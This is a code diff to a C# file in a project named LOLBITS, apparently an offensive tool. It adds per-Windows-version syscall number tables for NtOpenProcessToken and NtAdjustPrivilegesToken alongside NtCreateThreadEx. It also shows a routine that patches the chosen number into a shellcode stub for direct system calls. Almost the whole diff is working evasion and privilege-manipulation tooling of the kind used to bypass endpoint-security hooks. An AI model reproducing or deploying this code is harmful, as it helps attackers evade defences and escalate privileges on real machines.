@@ -10,7 +10,7 @@ namespace LOLBITS
         private Dictionary<string, Dictionary<string, int>> DicWinServ2012 = new Dictionary<string, Dictionary<string, int>>();
         private Dictionary<string, Dictionary<string, int>> DicWin7 = new Dictionary<string, Dictionary<string, int>>();
         private Dictionary<string, Dictionary<string, int>> DicWin8 = new Dictionary<string, Dictionary<string, int>>();
-        private Dictionary<string, Dictionary<string, int>> DicWin10 = new Dictionary<string, Dictionary<string, int>>();
+        private Dictionary<string, Dictionary<string, int>> DicWin10 = new Dictionary<string, Dictionary<string, int>>(); 
 
         private byte[] shellcode = new byte[]
              {
@@ -108,6 +108,67 @@ namespace LOLBITS
             DicWin8.Add("NtCreateThreadEx", Val8);
             DicWin10.Add("NtCreateThreadEx", Val10);
 
+            /////////////NtOpenProcessToken
+            Val2008 = new Dictionary<string, int>();
+            Val2012 = new Dictionary<string, int>();
+            Val7 = new Dictionary<string, int>();
+            Val8 = new Dictionary<string, int>();
+            Val10 = new Dictionary<string, int>();
+
+            Val2008.Add("SP0", 0x00F3);
+            Val2008.Add("SP2", 0x00F3);
+            Val2008.Add("R2", 0x00F9);
+            Val2008.Add("R2 SP1", 0x00F9);
+
+
+            Val2012.Add("SP0", 0x010B);
+            Val2012.Add("R2", 0x010E);
+
+            Val7.Add("UNIQUE", 0x00F9);
+
+            Val8.Add("8.0", 0x010B);
+            Val8.Add("8.1", 0x010E);
+
+            Val10.Add("1507", 0x0114);
+            Val10.Add("1511", 0x0117);
+            Val10.Add("1607", 0x0119);
+            Val10.Add("1703", 0x011D);
+            Val10.Add("1709", 0x011F);
+            Val10.Add("1803", 0x0121);
+            Val10.Add("1809", 0x0122);
+            Val10.Add("1903", 0x0123);
+            Val10.Add("1909", 0x0123);
+
+            DicWinServ2008.Add("NtOpenProcessToken", Val2008);
+            DicWinServ2012.Add("NtOpenProcessToken", Val2012);
+            DicWin7.Add("NtOpenProcessToken", Val7);
+            DicWin8.Add("NtOpenProcessToken", Val8);
+            DicWin10.Add("NtOpenProcessToken", Val10);
+
+            /////////////NtAdjustPrivilegesToken
+            Val2008 = new Dictionary<string, int>();
+            Val2012 = new Dictionary<string, int>();
+            Val7 = new Dictionary<string, int>();
+            Val8 = new Dictionary<string, int>();
+            Val10 = new Dictionary<string, int>();
+
+            Val2008.Add("UNIQUE", 0x003E);
+
+            Val2012.Add("SP0", 0x003F);
+            Val2012.Add("R2", 0x0040);
+
+            Val7.Add("UNIQUE", 0x003E);
+
+            Val8.Add("8.0", 0x003F);
+            Val8.Add("8.1", 0x0040);
+
+            Val10.Add("UNIQUE", 0x0041);
+            DicWinServ2008.Add("NtAdjustPrivilegesToken", Val2008);
+            DicWinServ2012.Add("NtAdjustPrivilegesToken", Val2012);
+            DicWin7.Add("NtAdjustPrivilegesToken", Val7);
+            DicWin8.Add("NtAdjustPrivilegesToken", Val8);
+            DicWin10.Add("NtAdjustPrivilegesToken", Val10);
+
 
         }
 
@@ -146,7 +207,7 @@ namespace LOLBITS
             }
 
             Dictionary<string, int> funct = dict[functionName];
-            var syscallValue = funct.ContainsKey("UNIQUE") ? funct["UNIQUE"] : funct[release];
+            int syscallValue = funct.ContainsKey("UNIQUE") ? funct["UNIQUE"] : funct[release];
             byte[] copy = shellcode;
             var syscallIdentifierBytes = BitConverter.GetBytes(syscallValue);
             Buffer.BlockCopy(syscallIdentifierBytes, 0, copy, 4, sizeof(uint));
